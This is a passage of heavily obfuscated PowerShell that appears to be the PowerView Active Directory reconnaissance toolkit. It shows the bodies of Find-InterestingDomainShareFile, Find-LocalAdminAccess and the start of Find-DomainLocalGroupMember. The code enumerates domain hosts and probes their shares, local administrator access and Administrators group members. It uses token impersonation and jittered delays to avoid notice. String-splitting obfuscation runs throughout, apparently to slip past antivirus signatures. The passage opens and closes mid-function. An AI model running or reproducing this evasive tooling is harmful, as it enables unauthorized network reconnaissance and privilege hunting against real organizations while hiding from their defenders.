        if (${p`Sb`ou`NdPa`RaMETE`RS}[("{1}{0}{2}" -f 'terNam','Compu','e')]) {
            ${TA`RgEtc`oMPuT`ERS} = ${CoMPu`TER`Na`me}
        }
        else {
            &("{2}{0}{1}"-f 'Verb','ose','Write-') ("{8}{12}{10}{3}{9}{7}{13}{2}{14}{15}{5}{0}{1}{11}{6}{4}" -f ' c','omput','u','nterestingDo','ain','g','m','ainShar','[','m','-I','ers in the do','Find','eFile] Q','e','ryin')
            ${T`A`RgEt`cO`MPuTErS} = &("{5}{1}{4}{2}{3}{0}"-f'r','-Do','ainComput','e','m','Get') @ComputerSearcherArguments | &("{1}{0}{2}"-f 'e','Select-Obj','ct') -ExpandProperty ("{1}{2}{0}"-f'e','dn','shostnam')
        }
        &("{3}{1}{0}{2}"-f's','te-Verbo','e','Wri') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${tA`RGeT`Co`mput`ErS}."LEn`gtH" -eq 0) {
            throw ("{7}{3}{5}{0}{2}{8}{6}{9}{4}{11}{10}{1}{12}" -f'in','m','gDomainS','In','nd to','terest','File] N','[Find-','hare','o hosts fou','enu',' ','erate')
        }

        
        ${h`ostenUM`Blo`Ck} = {
            Param(${c`omPUT`e`RnA`me}, ${INcL`UDE}, ${exCluD`eDs`HaRes}, ${Of`FIce`DO`cS}, ${Ex`clud`eh`I`dDEn}, ${FRe`Sh`eXeS}, ${che`CKWrIT`EA`Ccess}, ${tOKEn`H`ANDLE})

            if (${tO`K`ENHanDlE}) {
                
                ${N`ULL} = &("{0}{2}{3}{4}{5}{1}"-f'I','personation','nvok','e-','UserI','m') -TokenHandle ${t`oKe`NhAn`dle} -Quiet
            }

            ForEach (${t`Arg`etCOm`PutER} in ${coM`pu`TeRn`AMe}) {

                ${S`EArCH`SHArES} = @()
                if (${T`A`R`GEtCoMPU`TER}.("{3}{1}{2}{0}" -f 'th','tar','tsWi','S').Invoke('\\')) {
                    
                    ${seA`RCh`Sh`AReS} += ${T`Ar`GeTCOmpUT`er}
                }
                else {
                    ${up} = &("{1}{3}{2}{0}"-f 'nnection','Te','t-Co','s') -Count 1 -Quiet -ComputerName ${t`ARgE`TcoMPUT`eR}
                    if (${U`p}) {
                        
                        ${s`h`AreS} = &("{1}{2}{3}{0}"-f're','G','et-','NetSha') -ComputerName ${ta`RG`eTCo`M`PuTeR}
                        ForEach (${S`hAre} in ${SH`ARes}) {
                            ${S`hAR`EnAME} = ${S`HArE}."nA`ME"
                            ${p`AtH} = '\\'+${tar`g`ETcomput`Er}+'\'+${Sha`Re`N`AMe}
                            
                            if ((${S`hA`RENaMe}) -and (${shAre`N`AME}.("{0}{1}" -f'Tri','m').Invoke() -ne '')) {
                                
                                if (${E`XClUded`sH`A`RES} -NotContains ${sha`RE`N`AME}) {
                                    
                                    try {
                                        ${n`ULL} =  ( VARIable  6CL ).vaLuE::("{2}{0}{1}"-f 'etFile','s','G').Invoke(${P`AtH})
                                        ${Se`Ar`Chs`hares} += ${P`ATh}
                                    }
                                    catch {
                                        &("{1}{2}{0}{3}"-f'bo','Writ','e-Ver','se') ('['+'!] '+'No'+' '+'ac'+'cess '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${S`HaRE} in ${SeA`R`cHshAReS}) {
                    &("{0}{1}{2}" -f'Wri','t','e-Verbose') ('S'+'earch'+'ing '+'sha'+'r'+'e: '+"$Share")
                    ${S`ea`RCH`ArgS} = @{
                        ("{1}{0}"-f 'th','Pa') = ${S`haRe}
                        ("{0}{1}" -f'Includ','e') = ${inCl`U`dE}
                    }
                    if (${o`FfI`cedOCS}) {
                        ${Sea`RCh`ARgs}[("{0}{3}{2}{1}"-f'Of','Docs','ice','f')] = ${ofF`I`CeDO`Cs}
                    }
                    if (${FRe`SHe`XES}) {
                        ${sE`AR`CHargs}[("{2}{3}{0}{1}" -f'E','XEs','Fres','h')] = ${fRES`hE`X`es}
                    }
                    if (${l`AsTacce`Ss`TIme}) {
                        ${S`EaR`CH`ARgS}[("{1}{2}{3}{0}" -f'e','Las','tA','ccessTim')] = ${LAs`TaCc`EsSt`i`ME}
                    }
                    if (${La`sTwrIT`eTi`Me}) {
                        ${se`A`RchA`RgS}[("{1}{0}{2}"-f'astWrit','L','eTime')] = ${LAS`TWRIT`e`TiME}
                    }
                    if (${Cr`Eat`ioNTIme}) {
                        ${sEArc`H`ArGS}[("{2}{0}{1}" -f'ion','Time','Creat')] = ${C`ReatiOn`TI`mE}
                    }
                    if (${C`HE`CKWrIT`EaCCE`ss}) {
                        ${SEa`RChA`RGS}[("{0}{3}{1}{2}" -f'CheckWriteA','ces','s','c')] = ${C`heCKw`RItE`ACC`ESS}
                    }
                    &("{1}{0}{3}{5}{4}{2}"-f 'i','F','ile','nd','stingF','-Intere') @SearchArgs
                }
            }

            if (${TOK`eNhan`DlE}) {
                &("{1}{0}{3}{2}{4}" -f'ke-R','Invo','r','eve','tToSelf')
            }
        }

        ${l`OG`oNtoK`EN} = ${n`ULL}
        if (${psbo`U`NDpARaMe`TE`Rs}[("{0}{1}{2}" -f'C','red','ential')]) {
            if (${pS`BoUnDp`Ar`Am`ETE`RS}[("{0}{1}" -f 'D','elay')] -or ${pS`B`O`UndpAra`MEteRs}[("{1}{2}{3}{0}" -f 'ss','StopOn','Su','cce')]) {
                ${LOG`o`Nt`OKeN} = &("{6}{0}{3}{1}{4}{5}{2}" -f 'voke-Use','mp','n','rI','ersona','tio','In') -Credential ${CReD`enTi`Al}
            }
            else {
                ${LO`GONT`OKEn} = &("{1}{5}{2}{4}{3}{0}" -f'tion','Inv','rso','a','n','oke-UserImpe') -Credential ${C`R`eDeNT`ial} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${psBOuNdp`AR`AM`Et`ers}[("{0}{1}"-f 'Del','ay')] -or ${PsBo`U`NdPa`RaMeT`eRS}[("{1}{3}{2}{0}" -f 'cess','S','OnSuc','top')]) {

            &("{2}{3}{0}{1}" -f 'e-Ve','rbose','Wr','it') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{4}{3}{0}"-f'bose','W','ri','Ver','te-') ('[Find'+'-Int'+'erestingDo'+'m'+'ainS'+'ha'+'reFil'+'e] '+'Delay:'+' '+"$Delay, "+'Ji'+'t'+'ter: '+"$Jitter")
            ${C`oUN`TEr} = 0
            ${Ran`DNO} = &("{1}{0}{2}{3}"-f'e','N','w-Objec','t') ("{1}{3}{0}{2}" -f 'Ran','S','dom','ystem.')

            ForEach (${t`AR`getCOMpU`TeR} in ${taR`g`eTc`omPU`TeRS}) {
                ${c`oU`NTER} = ${Cou`NtEr} + 1

                
                &("{2}{0}{1}{3}" -f 'art','-S','St','leep') -Seconds ${RAn`dNo}.("{1}{0}" -f 't','Nex').Invoke((1-${JiT`TEr})*${De`l`AY}, (1+${j`I`Tter})*${dE`laY})

                &("{0}{1}{2}{3}{4}"-f'W','rite','-Ve','rb','ose') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{3}{2}{1}{0}" -f 'nd','omma','oke-C','Inv') -ScriptBlock ${hOsteNUmB`l`ocK} -ArgumentList ${tArGE`TcOMpU`Ter}, ${i`N`cludE}, ${E`xc`luDed`S`hAREs}, ${oFfICe`D`O`Cs}, ${ExcLuDe`H`IDdEN}, ${fRE`SHE`xeS}, ${C`hEC`kwrI`T`e`AccESs}, ${LOgo`Nto`k`En}
            }
        }
        else {
            &("{2}{1}{3}{0}"-f 'bose','-Ve','Write','r') ('[Find-I'+'nt'+'e'+'resting'+'DomainShar'+'eFile'+'] '+'Usin'+'g '+'th'+'readi'+'n'+'g '+'wi'+'th '+'thread'+'s'+': '+"$Threads")

            
            ${s`crip`TP`ArAms} = @{
                ("{0}{1}{2}" -f'I','nclu','de') = ${IN`cL`UdE}
                ("{0}{2}{1}{3}" -f'Exclud','r','edSha','es') = ${EXc`L`UDEdSH`ArES}
                ("{1}{0}{2}" -f 'fficeDo','O','cs') = ${of`FiCED`OCS}
                ("{3}{2}{4}{1}{0}" -f 'den','Hid','xclud','E','e') = ${ExC`LudeHI`D`D`EN}
                ("{1}{0}{2}"-f's','Fre','hEXEs') = ${Fre`S`HEXES}
                ("{1}{0}{3}{2}"-f'eckWri','Ch','ccess','teA') = ${Ch`EcKw`RiTEa`CCEsS}
                ("{1}{0}{2}"-f'kenHan','To','dle') = ${L`OgON`Token}
            }

            
            &("{4}{0}{2}{1}{3}" -f'ew-ThreadedFu','o','ncti','n','N') -ComputerName ${ta`R`GeTcO`MpuTe`Rs} -ScriptBlock ${h`o`STENUMBLOck} -ScriptParameters ${SC`Ri`PTp`A`Rams} -Threads ${THr`eA`Ds}
        }
    }

    END {
        if (${lOgo`N`TOkEN}) {
            &("{4}{5}{2}{1}{3}{0}" -f'lf','vertT','e','oSe','Invoke','-R') -TokenHandle ${L`og`O`NTokEn}
        }
    }
}


function FINd`-localaDmina`CCe`sS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f 'ouldProc','PSSh','es','s'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(PosiTIoN = 0, vaLuEfrOMPIpEliNe = ${TR`UE}, vaLUefromPIpELINEByPrOpeRtYNAmE = ${TR`Ue})]
        [Alias({"{2}{1}{3}{0}" -f 'me','S','DN','HostNa'})]
        [String[]]
        ${CO`M`pute`R`NAmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mP`U`TeRDoMAIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CO`mPut`erldAP`FilT`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoM`p`UT`eRse`A`RChBA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'm','ingSyste','Operat'})]
        [String]
        ${C`OmPUT`erOPErAtIn`GSySt`Em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'ck','cePa','Servi'})]
        [String]
        ${CoMPuT`eRSE`R`V`i`CE`PaCk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'eName','Si','t'})]
        [String]
        ${cOm`putERsi`Ten`AmE},

        [Switch]
        ${ChECKSH`A`Re`A`cceSS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{4}{1}"-f 'Do','troller','inC','ma','on'})]
        [String]
        ${seR`VER},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{2}{1}{0}"-f 'l','neLeve','O'}, {"{1}{0}{2}" -f 'btre','Su','e'})]
        [String]
        ${S`ea`RCh`SCOpE} = ("{2}{1}{0}"-f 'ree','ubt','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSu`LT`PaGEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERVe`R`TIMeL`I`MiT},

        [Switch]
        ${to`MBSt`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`Ent`IAL} =   (GET-vARIABLe 0DsQr ).Value::"EMP`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`LaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`iTt`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${t`HREads} = 20
    )

    BEGIN {
        ${c`OMpUtEr`seARChEr`Ar`GU`menTS} = @{
            ("{2}{1}{0}"-f's','pertie','Pro') = ("{0}{1}{2}" -f 'dnshos','tna','me')
        }
        if (${p`s`BouN`dpArAmeters}[("{0}{3}{4}{2}{1}"-f'C','rDomain','e','om','put')]) { ${cOMpUt`e`RSEa`R`ChEr`ARgUm`en`TS}[("{2}{1}{0}" -f'in','ma','Do')] = ${CoMP`UT`ERdoM`AIn} }
        if (${ps`Bo`UNDp`ArA`meTeRs}[("{2}{3}{0}{1}{4}" -f'LDAPFi','lt','Com','puter','er')]) { ${cO`mPuT`ERsE`ArcherARGu`m`eNTS}[("{1}{2}{0}" -f'ter','LDA','PFil')] = ${comP`UTE`Rl`DAPFiltEr} }
        if (${pS`BOU`N`Dpa`RamETErs}[("{1}{3}{2}{0}"-f'rchBase','Comput','rSea','e')]) { ${CoM`PU`TERsEA`RCHerar`gUMENTS}[("{0}{2}{1}" -f 'Sea','ase','rchB')] = ${CompU`TeRSEa`R`chB`AsE} }
        if (${Psb`ouNdpAr`AME`Te`Rs}[("{1}{2}{0}" -f 'strained','Unco','n')]) { ${C`OM`puT`e`RS`eAr`CHERa`R`GuMENTS}[("{1}{3}{2}{0}" -f 'ned','Unconst','ai','r')] = ${uNC`oN`st`R`AinED} }
        if (${psB`ou`N`dpaR`AMeTe`Rs}[("{1}{0}{3}{2}{5}{4}" -f'uterOp','Comp','ing','erat','tem','Sys')]) { ${cOMpUt`E`RS`e`Ar`cHE`RaRguMe`NtS}[("{2}{0}{4}{3}{1}"-f 'peratingSy','m','O','te','s')] = ${OPeRa`TINg`sySt`Em} }
        if (${PSb`oUNDP`Ar`AM`eTERs}[("{1}{2}{0}{3}"-f 'rviceP','Com','puterSe','ack')]) { ${cOM`PUTERsEa`R`c`heRaRgUMe`Nts}[("{2}{0}{1}" -f'rv','icePack','Se')] = ${SE`RV`i`cEpaCK} }
        if (${pSb`oU`NDPArAM`ETERS}[("{3}{0}{2}{1}{4}" -f 'S','teNam','i','Computer','e')]) { ${cOmPUterSEA`RC`hE`Rar`guM`e`N`Ts}[("{0}{1}{2}"-f 'S','ite','Name')] = ${s`IteN`AME} }
        if (${p`sboundP`Ar`A`MeTerS}[("{2}{0}{1}"-f 'erv','er','S')]) { ${c`oMPUTeR`SEA`R`ChErargU`m`ENtS}[("{0}{1}" -f'Ser','ver')] = ${sErv`Er} }
        if (${P`sBOun`D`p`ARaMetErs}[("{0}{3}{2}{1}"-f 'S','Scope','h','earc')]) { ${Co`M`PuTERSEarc`h`ERargUMen`Ts}[("{2}{0}{1}"-f'chS','cope','Sear')] = ${SEARc`H`s`cOPe} }
        if (${pSBOUNdpaR`Am`e`Te`RS}[("{0}{4}{1}{2}{3}"-f'Result','geS','iz','e','Pa')]) { ${cOmPuT`ErS`ea`RchEr`AR`G`UMENTS}[("{3}{0}{1}{2}"-f 'ul','tPageSiz','e','Res')] = ${R`esULTPa`G`esI`Ze} }
        if (${pSBo`U`Nd`PAr`AmETers}[("{3}{2}{0}{1}" -f'L','imit','erTime','Serv')]) { ${c`OmP`UTER`SeArc`H`E`RA`RgUmENts}[("{1}{0}{2}" -f 'erverTim','S','eLimit')] = ${ServeRt`i`Mel`imIT} }
        if (${PsBo`Und`pARa`Me`TE`RS}[("{0}{1}{2}" -f 'T','o','mbstone')]) { ${Co`mP`UtERS`eA`RcHE`RaRGuMeN`TS}[("{2}{1}{0}" -f 'e','on','Tombst')] = ${TomBs`T`one} }
        if (${PSBouNdPArA`M`ET`ErS}[("{0}{2}{1}" -f 'Cre','ential','d')]) { ${C`O`mpu`TER`Search`ErargUM`enTs}[("{2}{0}{1}"-f 'edentia','l','Cr')] = ${c`REdeN`TI`AL} }

        if (${p`S`BounD`p`ARAMEt`eRS}[("{2}{1}{0}{3}" -f'uterNa','mp','Co','me')]) {
            ${tAR`G`Et`C`OMPUTerS} = ${Co`mPUT`E`R`NaME}
        }
        else {
            &("{0}{3}{4}{1}{2}"-f'Writ','erbo','se','e-','V') ("{6}{3}{7}{0}{10}{13}{5}{12}{8}{11}{9}{4}{14}{15}{1}{2}{16}"-f 'alAdm','oma','i','-','pu','e','[Find','Loc','n',' com','inAccess]','g','ryi',' Qu','ters in ','the d','n')
            ${TArgET`co`m`PUt`ers} = &("{2}{1}{3}{0}"-f 'uter','omai','Get-D','nComp') @ComputerSearcherArguments | &("{3}{2}{0}{1}"-f 'ect','-Object','el','S') -ExpandProperty ("{1}{0}{3}{2}" -f'na','dnshost','e','m')
        }
        &("{0}{2}{1}"-f'Wri','-Verbose','te') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${taRg`etCo`mPU`TErS}."L`EngtH" -eq 0) {
            throw ("{1}{7}{0}{9}{6}{3}{2}{10}{5}{11}{4}{8}" -f '-LocalAdminA','[Fi','No hosts found',' ','t','o enu','cess]','nd','e','c',' t','mera')
        }

        
        ${hO`St`eN`Umblock} = {
            Param(${Co`mputE`RnAme}, ${T`o`KENhA`NdLe})

            if (${TO`KeNH`AnDLe}) {
                
                ${NU`lL} = &("{3}{4}{5}{0}{1}{2}"-f 'erson','atio','n','In','voke-User','Imp') -TokenHandle ${To`Ke`NHA`NDLe} -Quiet
            }

            ForEach (${targEt`coMpu`T`eR} in ${COMpU`Ter`N`A`mE}) {
                ${U`P} = &("{2}{0}{1}" -f'st-Co','nnection','Te') -Count 1 -Quiet -ComputerName ${tarG`Etc`OmP`UT`er}
                if (${uP}) {
                    
                    ${AC`CEss} = &("{3}{2}{0}{1}"-f'inAcces','s','est-Adm','T') -ComputerName ${tARGeTcOMpu`T`Er}
                    if (${ac`C`ESs}."iS`A`Dmin") {
                        ${taRg`E`TCo`MPUTEr}
                    }
                }
            }

            if (${Tok`ENha`NdlE}) {
                &("{0}{4}{2}{1}{3}"-f'Inv','ertToS','v','elf','oke-Re')
            }
        }

        ${LO`GOnT`OKeN} = ${n`ULL}
        if (${p`s`BoundPar`AmeTeRS}[("{2}{1}{0}"-f 'tial','eden','Cr')]) {
            if (${P`Sbo`UndPaRam`eTerS}[("{1}{0}" -f'y','Dela')] -or ${psboun`DPar`A`meTeRs}[("{3}{0}{1}{2}"-f'topOnSu','cces','s','S')]) {
                ${loGONtO`K`En} = &("{4}{3}{1}{2}{5}{0}"-f'ation','-','UserI','nvoke','I','mperson') -Credential ${c`Re`d`enTiaL}
            }
            else {
                ${L`og`ONt`Oken} = &("{4}{1}{0}{2}{5}{3}" -f 'ke-Use','vo','rImpe','onation','In','rs') -Credential ${crEdEN`T`I`Al} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${p`Sb`O`UNdPAr`AmetERs}[("{1}{0}"-f 'y','Dela')] -or ${psb`oUNDpaRa`mE`TerS}[("{0}{1}{2}{3}" -f'St','op','OnS','uccess')]) {

            &("{3}{0}{2}{1}" -f'i','rbose','te-Ve','Wr') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{3}{4}{0}{2}{1}" -f 'rbo','e','s','Wr','ite-Ve') ('[Fi'+'nd-Lo'+'c'+'alA'+'dmi'+'nAcces'+'s] '+'De'+'lay: '+"$Delay, "+'Ji'+'tter:'+' '+"$Jitter")
            ${c`oU`NtEr} = 0
            ${r`A`NDnO} = &("{2}{1}{0}" -f 'bject','ew-O','N') ("{1}{0}{2}" -f 'nd','System.Ra','om')

            ForEach (${taR`GETC`o`MpUTer} in ${t`ARGE`TCo`M`PutErs}) {
                ${CoU`NtEr} = ${coUN`T`Er} + 1

                
                &("{1}{2}{0}" -f 'eep','St','art-Sl') -Seconds ${r`A`NDNo}.("{0}{1}" -f 'N','ext').Invoke((1-${jiTt`ER})*${DeL`Ay}, (1+${jITT`Er})*${D`el`Ay})

                &("{0}{2}{1}" -f'Write-V','se','erbo') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{4}{1}{3}{0}{2}"-f 'man','nvoke-C','d','om','I') -ScriptBlock ${Hos`Te`NuMBLoCk} -ArgumentList ${TaRgEtC`O`MpUT`ER}, ${l`oG`on`TokeN}
            }
        }
        else {
            &("{1}{2}{0}"-f'rbose','Write-','Ve') ('[Find-'+'L'+'o'+'calAdminAc'+'c'+'ess] '+'Us'+'in'+'g '+'th'+'readin'+'g '+'with'+' '+'thr'+'e'+'ads: '+"$Threads")

            
            ${sc`RIp`T`PARAms} = @{
                ("{0}{3}{1}{2}"-f 'TokenHa','l','e','nd') = ${log`O`Nto`kEN}
            }

            
            &("{6}{5}{3}{2}{0}{1}{4}"-f 'dFu','ncti','de','a','on','e','New-Thr') -ComputerName ${TArg`et`C`OM`pu`TERS} -ScriptBlock ${Ho`ST`ENuMbL`ock} -ScriptParameters ${s`C`RIPtPa`RAmS} -Threads ${T`HReADs}
        }
    }
}


function Fin`D-domAIN`LOCa`lG`ROu`pMEMBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}{4}" -f'u','ro','ldP','PSSho','cess'}, '')]
    [OutputType({"{0}{8}{1}{5}{4}{3}{7}{2}{6}"-f'P','rV','er.AP','LocalGroup','ew.','i','I','Memb','owe'})]
    [OutputType({"{1}{6}{0}{3}{2}{5}{4}"-f'ca','Pow','roupMe','lG','inNT','mber.W','erView.Lo'})]
    Param(
        [Parameter(poSItIoN = 0, VAlUEFROMPiPeliNe = ${Tr`Ue}, vaLuefROmPIpelinebypROpertYnAMe = ${Tr`UE})]
        [Alias({"{0}{2}{1}"-f'DNSHos','Name','t'})]
        [String[]]
        ${CO`MPut`er`Na`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPUTErD`o`mA`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`oMp`U`T`ERLDapF`iLTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOm`pU`T`eRseArC`hBA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f'gSy','n','stem','Operati'})]
        [String]
        ${coM`Pu`TeROPEratINg`sYST`em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}" -f'P','Servic','ack','e'})]
        [String]
        ${CO`mputEr`SE`R`VICepACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'Name','Site'})]
        [String]
        ${cO`mP`UTErsitEna`ME},

        [Parameter(VaLUEfROMpiPElInebYpropErTYnAme = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${g`ROUP`N`AmE} = ("{0}{2}{3}{1}{4}"-f'A','trat','dmi','nis','ors'),

        [ValidateSet('API', {"{0}{1}"-f 'WinN','T'})]
        [Alias({"{1}{3}{0}{2}"-f 'ho','Collectio','d','nMet'})]
        [String]
        ${m`Et`HoD} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}"-f 'm','ainContro','ller','Do'})]
        [String]
        ${s`E`RvEr},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{0}{1}{2}" -f 'On','eLeve','l'}, {"{1}{0}" -f 'e','Subtre'})]
        [String]
        ${seARcHs`c`oPE} = ("{1}{0}" -f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`e`s`UlT`paGeSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`VE`RtImel`iMIT},

        [Switch]
        ${t`OmbSt`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Ed`EnTI`Al} =   $0DSQR::"eM`PTy",

        [ValidateRange(1, 10000)]
        [Int]
        ${de`L`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jiT`Ter} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`hRe`ADS} = 20
    )

    BEGIN {
        ${C`ompuT`eRsearChERArg`UmEN`Ts} = @{
            ("{2}{0}{1}" -f'rop','erties','P') = ("{2}{0}{3}{1}"-f 'nsh','stname','d','o')
        }
        if (${ps`BOuNDpar`AmE`TERs}[("{0}{2}{1}{3}"-f'Compu','rDoma','te','in')]) { ${CompuTer`SeArC`HERArgU`me`NtS}[("{1}{0}"-f'main','Do')] = ${cO`mp`Ut`eRDOMAin} }
        if (${psb`oUN`dparaMe`T`ERS}[("{0}{2}{3}{1}" -f 'Co','Filter','mput','erLDAP')]) { ${c`OM`PUterS`ea`Rc`heRaRGUM`eNtS}[("{0}{2}{1}"-f 'LDAP','er','Filt')] = ${cOm`put`ER`lDApF`I`l`TEr} }
        if (${pSb`ouNdpAR`A`MeTErS}[("{2}{0}{1}{3}" -f'erSea','rchBas','Comput','e')]) { ${COmpuTe`RsE`Arc`h`EraR`GUmEnTS}[("{1}{2}{0}"-f'hBase','S','earc')] = ${c`oM`pUTeRsE`ArchB`Ase} }
        if (${pSBou`Ndp`AR`AM`etE`Rs}[("{1}{0}{3}{2}" -f'stra','Uncon','d','ine')]) { ${COm`put`eRse`A`RchErArg`UMe`NtS}[("{2}{0}{3}{1}"-f'strai','d','Uncon','ne')] = ${UN`CoNsT`RAiN`Ed} }
        if (${p`SbOuNdPAR`A`M`E`TERS}[("{1}{2}{4}{0}{7}{5}{6}{3}" -f'uterOper','Co','m','em','p','i','ngSyst','at')]) { ${coM`PUtErsEArcHE`R`ArGuMe`NtS}[("{3}{1}{2}{0}"-f 'ystem','at','ingS','Oper')] = ${OPerAT`I`NGsY`STEm} }
        if (${PsBOu`ND`paRa`m`e`TERs}[("{4}{3}{2}{0}{1}" -f'iceP','ack','terServ','mpu','Co')]) { ${com`PUTerseA`Rc`herARG`UMe`NTs}[("{1}{0}{2}" -f 'a','ServiceP','ck')] = ${SE`R`VIC`ePaCK} }
        if (${psb`OUndpA`R`Ame`TErS}[("{0}{4}{2}{1}{3}"-f 'Compute','Na','te','me','rSi')]) { ${COMPutER`SeARC`HEra`R`GumEnTs}[("{0}{1}{2}" -f'S','iteNam','e')] = ${SITEnA`mE} }
        if (${pSBO`UnDp`AR`AM`E`TerS}[("{0}{2}{1}"-f 'S','er','erv')]) { ${cOmpu`TE`R`SE`AR`ChEraR`gUM`EntS}[("{1}{0}{2}" -f 'e','Serv','r')] = ${SErV`ER} }
        if (${PsB`OU`NDPArAm`E`TE`RS}[("{0}{2}{1}"-f'Se','ope','archSc')]) { ${cOmputeRse`A`R`CHeraRGUmEN`TS}[("{2}{1}{0}"-f 'pe','Sco','Search')] = ${seaRC`hsC`O`pE} }
        if (${psBo`UN`D`PARam`EtErs}[("{0}{1}{3}{2}" -f'Re','su','ize','ltPageS')]) { ${Co`Mput`ers`e`ARc`H`erARgU`mENTs}[("{1}{4}{3}{0}{2}" -f'Page','Re','Size','t','sul')] = ${R`e`SULTPa`gE`SiZE} }
        if (${pSBOUn`Dp`ArAMe`TERs}[("{0}{4}{3}{1}{2}"-f'Serv','eLimi','t','Tim','er')]) { ${CoMPUtERSearCherA`R`G`U`meN`TS}[("{0}{1}{3}{4}{2}"-f'Serv','erTi','Limit','m','e')] = ${SeRVE`Rt`Im`ELimit} }
        if (${PSBOUnDPAR`A`mE`Ters}[("{1}{2}{0}"-f 'ne','T','ombsto')]) { ${c`ompUtersEA`RCHeRa`RG`UmeN`TS}[("{2}{1}{0}"-f'ne','bsto','Tom')] = ${T`O`mBst`onE} }
        if (${pSboU`N`dpAR`AME`TeRS}[("{0}{1}{2}"-f'Cr','ed','ential')]) { ${COMp`UteRs`ea`RCHerArgU`meNtS}[("{1}{2}{0}" -f 'l','C','redentia')] = ${Cr`EDe`NT`IAl} }

        if (${P`S`B`ouN`DParAMEt`erS}[("{1}{0}{3}{2}"-f'mpute','Co','me','rNa')]) {
            ${TAR`gEtC`O`mputeRs} = ${cOmPU`T`ErNa`Me}
        }
        else {
            &("{1}{3}{2}{0}"-f 'e-Verbose','Wr','t','i') ("{11}{14}{9}{7}{5}{8}{1}{3}{10}{13}{6}{4}{15}{2}{12}{16}{0}" -f'in','alG',' i','ro','ompute','mainLo','ing c','o','c','D','upMem','[Fin','n the dom','ber] Query','d-','rs','a')
            ${tarGe`Tco`mp`U`TERs} = &("{1}{0}{3}{2}"-f'et-D','G','ter','omainCompu') @ComputerSearcherArguments | &("{3}{1}{2}{0}"-f 'ct','ct-Obj','e','Sele') -ExpandProperty ("{2}{1}{3}{0}"-f'me','nshost','d','na')
        }
        &("{1}{0}{2}" -f 'ite-','Wr','Verbose') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${t`Ar`gE`TCoMP`UTErS}."LeNG`Th" -eq 0) {
            throw ("{3}{4}{0}{7}{8}{13}{12}{9}{1}{6}{11}{10}{2}{5}"-f '-Dom',' ',' enum','[F','ind','erate','No ','ainLocalGr','o','ber]','d to','hosts foun','Mem','up')
        }

        
        ${hOSt`E`N`U`mbLOck} = {
            Param(${coM`puTEr`N`A`me}, ${gr`o`UpNamE}, ${M`Et`hOD}, ${tOkeNH`An`DLe})

            
            if (${Gr`OuPN`AMe} -eq ("{2}{0}{4}{3}{1}"-f'dm','tors','A','istra','in')) {
                ${aDM`I`NSEcuR`ItY`i`D`EnTI`FIeR} = &("{0}{2}{3}{1}" -f 'N','ject','ew-','Ob') ("{5}{4}{6}{1}{2}{7}{0}{3}"-f'cipal.Security','.','Security.Pr','Identifier','e','Syst','m','in')(  (  gEt-varIAbLe ("PX"+"4Q")  ).vAluE::"buIlTiNA`D`M`INIS`TRAT`OR`Ss`id",${N`Ull})
                ${gRou`Pn`A`ME} = (${a`DmInSEcuRiT`yIdE`NtiF`iER}."TrA`Nsl`AtE"([System.Security.Principal.NTAccount])."vAl`Ue" -split "\\")[-1]
            }

            if (${Tok`EnhAnD`le}) {
                
                ${N`ULl} = &("{0}{5}{4}{1}{3}{2}{6}"-f 'Inv','-User','mperso','I','e','ok','nation') -TokenHandle ${ToKEN`HA`Ndle} -Quiet
            }

            ForEach (${tARGEtCo`M`pu`TEr} in ${C`OMPU`TeR`Name}) {
                ${U`p} = &("{0}{2}{1}{3}" -f 'Test','Conne','-','ction') -Count 1 -Quiet -ComputerName ${tA`RgET`COM`puT`er}
                if (${Up}) {
                    ${n`e`TlOcaLgROu`pm`E`MBerArgu`M`Ents} = @{
                        ("{2}{1}{0}"-f'terName','u','Comp') = ${tARg`etC`OmpU`TeR}
